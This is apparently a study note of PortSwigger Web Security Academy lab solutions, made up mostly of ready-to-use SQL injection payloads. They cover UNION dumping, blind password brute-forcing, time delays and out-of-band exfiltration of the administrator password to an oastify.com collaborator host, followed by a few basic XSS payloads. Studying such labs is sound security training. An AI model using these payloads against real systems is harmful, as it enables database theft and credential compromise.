---
title: PortSwigger Web Security Labs
date: 2026-02-03
categories: [BSCP]
tags: [web]
description: "Note for Web Security Labs"
---

## SQL Injection
### Cheat Sheet
- Cheat Sheet can be found [here](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Notes
To do further injection, the first thing we should check is the number of columns. We can use this query `' ORDER BY {number}`, and if we see the server is crashed, for example, when injecting `' ORDER BY 3`, it means that the database has 2 columns. Most of the labs here have 2 columns.

### Labs
- Useful resources from AI can be found [here](https://chatgpt.com/share/6984ac5e-6544-800d-84c1-02420cc47e47).
```sql
-- used to retrieve hidden data and bypass authentication
OR 1=1 -- -
-- querying the database type and version on Oracle
UNION SELECT NULL, banner FROM v$version -- -
-- querying the database type and version on MySQL and Microsoft
UNION SELECT NULL, @@version -- -
-- listing the database contents on non-Oracle databases
UNION SELECT NULL, schema_name FROM information_schema.schemata -- - list databases
UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dbname' -- - list tables in a database
UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='table_name' -- - list columns in a table
UNION SELECT column1, column2 FROM table_name -- - dump datas
-- listing the database contents on Oracle
UNION SELECT NULL, banner FROM v$version -- - same as show version but can skip to list tables
UNION SELECT NULL, table_name FROM all_tables -- - list tables
UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='table_name' -- - list columns
UNION SELECT column1, column2 FROM table_name -- - dump datas
-- determining the number of columns returned by the query
UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- -
-- finding a column containing text
UNION SELECT 1, 'JqsAUV', 1 FROM information_schema.schemata -- - if give string value to a column and the server is crashed, it means that column is int
-- retrieving data from other tables
UNION SELECT username, password FROM users -- -
-- retrieving multiple values in a single column
UNION SELECT 1, CONCAT(username, password) FROM users -- - 
-- Blind SQL injection with conditional responses
AND (SELECT 'x' FROM information_schema.tables WHERE table_name='users')='x' -- - verify if table exists
AND (SELECT 'x' FROM users WHERE username='administrator')='x' -- - confirm if user exists
AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 -- - get password's length
AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='8' -- - bruteforce password char by char
-- Blind SQL injection with conditional errors (oracle)
AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL -- - confirming the error
AND (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- - check password length
AND (SELECT CASE WHEN (SUBSTR(password, 1, 1)='c') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- - bruteforce password char by char
-- Visible error-based SQL injection (postgreSQL)
AND 1=CAST((SELECT username from users LIMIT 1) AS int) -- - get username
AND 1=CAST((SELECT password from users LIMIT 1) AS int) -- - get password
-- Blind SQL injection with time delays (postgreSQL)
AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END) IS NULL -- -
-- Blind SQL injection with time delays and information retrieval
AND (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='1') THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
-- Blind SQL injection with out-of-band interaction
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://j0knga2di90fioeb8ob35jtkpbv2jw7l.oastify.com/"> %remote;]>'),'/l') FROM dual -- -
-- Blind SQL injection with out-of-band data exfiltration
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.g0hkg72ai60cile88lb05gthp8vzju7j.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
-- SQL injection with filter bypass via XML encoding
<@hex_entities>1 UNION SELECT username || ':' || password from users</@hex_entities>
```

- Solver for Blind SQL injection with conditional responses can be found [here](/assets/solutions/portswigger/conditional_responses.py).
- Solver for Blind SQL injection with conditional errors can be found [here](/assets/solutions/portswigger/conditional_errors.py).
- Solver for Blind SQL injection with time delays and information retrieval can be found [here](/assets/solutions/portswigger/time_delays.py).

## Cross-site Scripting (XSS)
### Cheat Sheet
### Notes
### Labs
```shell
# Reflected XSS into HTML context with nothing encoded
<script>alert(1)</script>
# Stored XSS into HTML context with nothing encoded
<script>alert(1)</script>
# DOM XSS in document.write sink using source location.search
\"><script>alert(1)</script>
# DOM XSS in innerHTML sink using source location.search
<img src=x onerror=alert(1)>  
# 
```